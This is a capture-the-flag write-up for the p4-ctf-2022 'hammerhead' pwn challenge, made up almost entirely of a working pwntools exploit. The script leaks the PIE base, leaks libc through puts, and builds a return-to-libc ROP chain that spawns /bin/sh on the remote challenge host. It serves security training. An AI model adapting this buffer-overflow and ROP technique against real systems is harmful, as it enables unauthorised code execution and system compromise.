# p4-ctf-2022 - hammerhead - pwn - 25 solves

the challenge was about leaking the pie and then ret2libc

## exploit

```python
from pwn import *

local = False
fileName = './hammerhead'
e = ELF(fileName)
libc = ELF('./libc.so.6')

if local:
    p = process(fileName)
    # gdb.attach(p,'''
    #     b *loop
    # ''')
else:
    p = remote('hammerhead.zajebistyc.tf',4004)

popRdi = 0x00000000000012fb
putsAddress = 0x123a

def loop():
    payload = b'a'*40
    payload += p64(e.sym['main'])
    payload += b'a' * (64-len(payload))
    p.send(payload)
    p.send(b'exit')

payload = b'a'*40
p.send(payload)
leaked = p.recvline()
leaked = leaked[40:-1]
leaked = u64(leaked.strip().ljust(8, b"\x00"))
log.info(f'pie leakd: {hex(leaked)}')
pie = leaked - 0x1295

e.address = pie

loop()

payload = b'a'*40
payload += p64(pie+ popRdi)
payload += p64(e.got['puts'])
payload += p64(pie + putsAddress)

payload += b'a' * (64-len(payload))
p.send(payload)
p.send(b'exit')


p.recvline()
p.recvline()
p.recvline()
p.recvline()
puts_leaked = p.recvline()
puts_leaked = u64(puts_leaked.strip().ljust(8, b"\x00"))
log.info(f'puts leakd: {hex(puts_leaked)}')

libc.address = puts_leaked - libc.sym['puts']

log.info(f'libc address: {hex(libc.address)}')

system = libc.sym['system']
bin_sh = next(libc.search(b'/bin/sh\x00'))
log.info(f'bin_sh address: {hex(bin_sh)}')
log.info(f'system address: {hex(system)}')

payload = b'a'*40
payload += p64(pie+popRdi)
payload += p64(bin_sh)
payload += p64(system)
payload += b'a' * (64-len(payload))

p.send(payload)
p.send(b'exit')

p.interactive()
```
